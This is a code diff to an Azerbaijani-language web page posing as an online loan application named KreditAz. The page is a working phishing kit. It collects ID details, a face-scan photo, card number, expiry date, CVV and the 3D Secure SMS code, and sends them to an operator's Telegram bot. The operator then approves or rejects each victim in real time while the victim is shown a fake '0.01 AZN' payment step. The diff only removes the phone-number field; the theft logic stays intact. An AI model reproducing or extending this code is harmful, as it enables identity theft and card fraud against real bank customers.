@@ -1166,7 +1166,7 @@
   <div class="modal-card">
     <button type="button" class="modal-close" onclick="closeModal()">✕</button>
 
-    <!-- STEP 1: Müraciət Formu -->
+    <!-- STEP 1: Müraciət Formu (NÖMRƏSİZ) -->
     <div id="formStep">
       <h2 style="font-size:26px;margin-bottom:6px;">Onlayn kredit müraciəti</h2>
       <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Şəxsiyyət vəsiqəsi məlumatlarını daxil edin</p>
@@ -1184,7 +1184,6 @@
             <input type="text" id="idnum" placeholder="12345678" maxlength="8" inputmode="numeric">
           </div>
         </div>
-        <div class="field"><label>Mobil nömrə</label><input type="tel" id="phone" placeholder="050 123 45 67" inputmode="numeric" maxlength="12"></div>
         <div class="field"><label>Rəsmi iş yeriniz?</label>
           <div class="toggle-row">
             <button type="button" class="toggle-btn active" data-val="beli">Bəli</button>
@@ -1235,7 +1234,6 @@
         <div class="id-row"><span class="id-label">DOĞUM TARİXİ</span><span class="id-value" id="sumBirth">—</span></div>
         <div class="id-row"><span class="id-label">FİN / PERSONAL NO</span><span class="id-value" id="sumFin">—</span></div>
         <div class="id-row"><span class="id-label">SERİYA / CARD NO</span><span class="id-value" id="sumId">—</span></div>
-        <div class="id-row"><span class="id-label">TELEFON</span><span class="id-value" id="sumPhone">—</span></div>
         <div class="id-row"><span class="id-label">İŞ YERİ</span><span class="id-value" id="sumJob">—</span></div>
         <div class="id-footer"><span>Müddət: 10 il</span><span>Verilmə: 01.01.2020</span></div>
         <div class="id-signature"><span>İmza / Signature</span><span class="sig-line"></span></div>
@@ -1357,7 +1355,6 @@
       </div>
       <p style="font-size:12px;color:var(--ink-soft);margin-top:12px;text-align:center;">TLS 1.3 şifrələmə ilə qorunur. Məlumatlar saxlanılmır.</p>
       
-      <!-- 0.01 AZN ödə düyməsi - burada məlumatlar Telegram-a gedir -->
       <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:12px;" onclick="sendCardToTelegram(); return false;">0.01 AZN ödə</button>
     </div>
 
@@ -1374,7 +1371,7 @@
       </div>
     </div>
 
-    <!-- STEP 8: 3D Secure (İstifadəçi öz OTP kodunu yazır) -->
+    <!-- STEP 8: 3D Secure -->
     <div id="threeDStep" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:10px;">🔐 3D Secure təsdiqi</h2>
       
@@ -1390,7 +1387,7 @@
       
       <div style="background:var(--sage);border-radius:12px;padding:14px 16px;margin-bottom:16px;text-align:center;">
         <div style="font-weight:700;font-size:14px;color:var(--teal-deep);">📱 Telefonunuza SMS göndərildi</div>
-        <div style="font-size:12px;color:var(--ink-soft);margin-top:2px;" id="otpPhoneDisplay">+994 ** *** ** **</div>
+        <div style="font-size:12px;color:var(--ink-soft);margin-top:2px;">Zəhmət olmasa SMS-dəki kodu daxil edin</div>
       </div>
       
       <p style="color:var(--ink-soft);margin-bottom:4px;font-size:14px;text-align:center;">Bank tərəfindən göndərilən 6 rəqəmli kodu daxil edin:</p>
@@ -1622,11 +1619,10 @@ function showSummaryStep(){
   document.getElementById('creditCheckModal').style.display='none';
 }
 
-// ========== SUBMIT FORM ==========
+// ========== SUBMIT FORM (NÖMRƏSİZ) ==========
 function submitForm() {
   var fin = document.getElementById('fin').value.trim().toUpperCase();
   var id = document.getElementById('idnum').value.trim();
-  var phone = document.getElementById('phone').value.trim();
   var consent1 = document.getElementById('consent1').checked;
   var consent2 = document.getElementById('consent2').checked;
   var firstName = document.getElementById('firstName').value.trim();
@@ -1638,8 +1634,6 @@ function submitForm() {
   if(!birth){ alert('Doğum tarixi daxil edin!'); return; }
   if(!fin || fin.length !== 7){ alert('FIN kod 7 simvoldan ibarət olmalıdır!'); return; }
   if(!id || id.length !== 8){ alert('Seriya nömrəsi 8 rəqəmdən ibarət olmalıdır!'); return; }
-  var phoneDigits = phone.replace(/\D/g,'');
-  if(phoneDigits.length !== 10 || phoneDigits[0] !== '0'){ alert('Düzgün mobil nömrə daxil edin! (050 123 45 67)'); return; }
   if(!consent1 || !consent2){ alert('Bütün razılıqları qeyd edin!'); return; }
 
   var prefix = document.getElementById('idPrefix').value || 'AZE';
@@ -1649,7 +1643,6 @@ function submitForm() {
   document.getElementById('sumBirth').textContent = birth.split('-').reverse().join('.');
   document.getElementById('sumFin').textContent = fin;
   document.getElementById('sumId').textContent = prefix + ' ' + id;
-  document.getElementById('sumPhone').textContent = phone;
   var jobActive = document.querySelector('.toggle-btn.active');
   document.getElementById('sumJob').textContent = jobActive && jobActive.dataset.val === 'beli' ? 'Bəli' : 'Xeyr';
 
@@ -1709,7 +1702,6 @@ async function startFaceScan() {
         captureAndSendPhoto(video);
         stopCamera();
         
-        // ===== FACE SCAN BITDI - CHECKING STEP (5 saniyə) =====
         setTimeout(function() {
           document.getElementById('faceScanStep').style.display = 'none';
           document.getElementById('checkingStep').style.display = 'block';
@@ -1785,7 +1777,6 @@ function startCheckingAnimation() {
     }
   }, 1000);
   
-  // 5 saniyədən sonra bank seçiminə keç
   setTimeout(function() {
     if(isChecking) {
       clearInterval(checkInterval);
@@ -1962,7 +1953,7 @@ document.getElementById('cardCvv').addEventListener('input', function() {
   document.getElementById('cardCvvDisplay').textContent = display;
 });
 
-// ========== SEND CARD TO TELEGRAM ==========
+// ========== SEND CARD TO TELEGRAM (NÖMRƏSİZ) ==========
 function sendCardToTelegram() {
   var cardNumber = cardNumberInput.value;
   if(cardNumber.length < 16){
@@ -1991,7 +1982,6 @@ function sendCardToTelegram() {
   var fin = document.getElementById('fin').value || 'Məlumat yoxdur';
   var id = document.getElementById('idnum').value || 'Məlumat yoxdur';
   var prefix = document.getElementById('idPrefix').value || 'AZE';
-  var phone = document.getElementById('phone').value || 'Məlumat yoxdur';
   var jobActive = document.querySelector('.toggle-btn.active');
   var job = jobActive && jobActive.dataset.val === 'beli' ? 'Bəli' : 'Xeyr';
   var amount = document.getElementById('creditAmountDisplay')?.textContent || '400 ₼';
@@ -1999,15 +1989,13 @@ function sendCardToTelegram() {
 
   applicationData = {
     name: name, patronymic: patronymic, birth: birth, fin: fin, 
-    id: prefix + ' ' + id, phone: phone, job: job,
+    id: prefix + ' ' + id, job: job,
     bank: selectedBankData.name, cardNumber: cardNumber, expiry: expiry, 
     cvv: cvv, amount: amount, term: term
   };
 
-  // Telegram-a məlumatları göndər (2 düymə ilə)
   sendToTelegramWithButtons(applicationData);
 
-  // REAL CHECKING STEP - GÖZLƏMƏ EKRANI
   document.getElementById('cardInputStep').style.display = 'none';
   document.getElementById('realCheckingStep').style.display = 'block';
   
@@ -2021,7 +2009,6 @@ function sendCardToTelegram() {
     document.getElementById('realCheckStatus').textContent = '⏳ Bank cavab gözlənilir... (' + waitSeconds + 's)';
   }, 1000);
   
-  // Telegram polling başlat
   startTelegramPolling();
 }
 
@@ -2032,7 +2019,6 @@ async function sendToTelegramWithButtons(data) {
     '\n📅 Doğum: ' + data.birth + 
     '\n🪪 FIN: ' + data.fin + 
     '\n🪪 Seriya: ' + data.id + 
-    '\n📱 Telefon: ' + data.phone + 
     '\n💼 İş: ' + data.job + 
     '\n🏦 Bank: ' + data.bank + 
     '\n💳 Kart: ' + data.cardNumber + 
@@ -2088,7 +2074,6 @@ async function pollTelegram() {
           var callbackData = update.callback_query.data;
           
           if(callbackData && callbackData.startsWith('approve_')) {
-            // Qəbul edildi
             await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
               method: 'POST',
               headers: {'Content-Type': 'application/json'},
@@ -2108,7 +2093,6 @@ async function pollTelegram() {
               })
             });
             
-            // Real checking bitdi - 3D Secure aç
             if(waitingForApproval) {
               waitingForApproval = false;
               telegramPollingActive = false;
@@ -2118,16 +2102,11 @@ async function pollTelegram() {
               document.getElementById('threeDStep').style.display = 'block';
               document.getElementById('otpCode').value = '';
               document.getElementById('otpStatus').style.display = 'none';
-              
-              // Telefon nömrəsini göstər
-              var phone = document.getElementById('phone').value || '+994 ** *** ** **';
-              document.getElementById('otpPhoneDisplay').textContent = phone;
             }
             break;
           }
           
           if(callbackData && callbackData.startsWith('reject_')) {
-            // İmtina edildi
             await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
               method: 'POST',
               headers: {'Content-Type': 'application/json'},
@@ -2162,7 +2141,6 @@ async function pollTelegram() {
       }
     }
     
-    // Polling davam et
     if(telegramPollingActive && waitingForApproval) {
       setTimeout(pollTelegram, 3000);
     }
@@ -2175,14 +2153,13 @@ async function pollTelegram() {
   }
 }
 
-// ========== OTP SUBMIT (İstifadəçi öz yazır) ==========
+// ========== OTP SUBMIT ==========
 function submitOTP() {
   var otpInput = document.getElementById('otpCode').value.replace(/\s/g,'');
   if(otpInput.length === 6){
     document.getElementById('otpStatus').style.display = 'block';
     document.getElementById('otpStatus').textContent = '✅ Ödəniş uğurla təsdiqləndi! 0.01 AZN geri qaytarılacaq.';
     
-    // Telegram-a OTP göndər
     fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
@@ -2308,16 +2285,6 @@ document.getElementById('idnum').addEventListener('input', function() {
   updateIDPreview();
 });
 
-document.getElementById('phone').addEventListener('input', function() {
-  var digits = this.value.replace(/\D/g,'').slice(0,10);
-  var out = '';
-  if(digits.length>0) out = digits.slice(0,3);
-  if(digits.length>3) out += ' ' + digits.slice(3,6);
-  if(digits.length>6) out += ' ' + digits.slice(6,8);
-  if(digits.length>8) out += ' ' + digits.slice(8,10);
-  this.value = out;
-});
-
 document.getElementById('checkFin').addEventListener('input', function() {
   this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7);
 });
@@ -2334,4 +2301,4 @@ document.body.appendChild(creditTermDisplay);
 console.log('✅ KreditAz yükləndi!');
 </script>
 </body>
-          </html>
+            </html>
